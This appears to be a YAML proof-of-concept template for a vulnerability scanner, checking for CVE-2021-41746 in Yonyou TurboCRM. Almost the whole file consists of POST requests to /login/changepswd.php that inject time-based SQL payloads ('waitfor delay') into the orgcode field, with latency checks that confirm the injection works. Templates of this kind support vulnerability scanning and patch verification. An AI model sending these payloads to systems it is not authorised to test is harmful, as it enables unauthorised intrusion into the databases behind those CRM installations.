name: poc-yaml-yongyou-turbo-cve-2021-41746-sqli
binding: 30a73eb9-2218-44a8-9a44-2cea841a91c2
manual: true
detail:
    author: Naraku
    links:
        - https://github.com/purple-WL/Yonyou-TurboCRM-SQL-injection/issues/1
    vulnerability:
        id: CT-198391
        level: high
transport: http
set:
    sleepSecond: randomInt(5, 7)
    sleepSecond1: randomInt(2, 4)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login/changepswd.php?loginname=&orgcode=
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                confirmpswd=1&key=1&loginname=1&oldpassword=1&orgcode=';%20waitfor%20delay%20'0:0:0'%20--%20&password=1&submit=1
        expression: response.status == 200 && response.body_string.contains("TDBException") && response.body_string.contains("Database error")
        output:
            r0latency: response.latency
    r1:
        request:
            cache: true
            method: POST
            path: /login/changepswd.php?loginname=&orgcode=
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                confirmpswd=1&key=1&loginname=1&oldpassword=1&orgcode=';%20waitfor%20delay%20'0:0:{{sleepSecond}}'%20--%20&password=1&submit=1
        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
    r2:
        request:
            cache: true
            method: POST
            path: /login/changepswd.php?loginname=&orgcode=
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                confirmpswd=1&key=1&loginname=1&oldpassword=1&orgcode=';%20waitfor%20delay%20'0:0:{{sleepSecond1}}'%20--%20&password=1&submit=1
        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 500
expression: r0() && r1() && r2()
